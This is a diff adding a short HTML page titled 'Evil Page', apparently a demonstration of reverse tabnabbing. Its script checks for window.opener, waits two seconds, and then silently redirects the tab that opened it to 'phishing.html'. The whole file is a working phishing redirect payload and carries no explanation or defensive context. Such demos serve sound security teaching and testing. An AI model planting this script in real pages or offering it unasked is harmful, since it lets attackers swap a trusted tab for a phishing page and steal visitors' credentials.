@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Evil Page</title>
+  </head>
+  <body>
+    <h1>Evil Site</h1>
+    <p>This is the evil site. Wait a few seconds...</p>
+    <script>
+      if (window.opener) {
+        setTimeout(function () {
+          window.opener.location.replace("phishing.html");
+        }, 2000); // Delay for 2 seconds
+      }
+    </script>
+  </body>
+</html>
